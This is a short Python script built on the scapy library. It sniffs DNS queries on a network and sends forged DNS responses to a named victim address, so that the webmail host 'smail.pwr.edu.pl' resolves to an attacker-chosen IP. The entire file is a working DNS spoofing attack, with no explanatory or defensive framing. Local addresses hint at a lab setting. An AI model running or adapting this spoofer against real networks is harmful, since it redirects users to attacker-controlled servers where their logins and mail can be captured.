from __future__ import print_function
from scapy.all import *
 
dns_ip = '159.90.200.7'
bpf_filt = 'udp dst port 53 and ip dst {0}'.format(dns_ip)
spoofed_ip = '192.168.43.128'
url_to_spoof = 'smail.pwr.edu.pl'
victim_ip = '192.168.43.230'
 
spfResp = IP(dst=victim_ip,src=dns_ip)/UDP(sport=53)/DNS(qr = 1,qdcount = 1,ancount=1,an=DNSRR(ttl=3,rclass='IN',rrname=url_to_spoof,rdata=spoofed_ip))


def dns_responder(pkt):

    if (DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[IP].src != dns_ip ):

        if url_to_spoof in str(pkt['DNS Question Record'].qname):
            spfResp[UDP].dport = pkt[UDP].sport
            spfResp[DNS].id = pkt[DNS].id
            spfResp[DNS].qd = pkt[DNS].qd
 
            send(spfResp, verbose=0)
            print(spfResp.show())
            print('Spoofed DNS Response Sent')
 
 
sniff(filter=bpf_filt, prn=dns_responder)

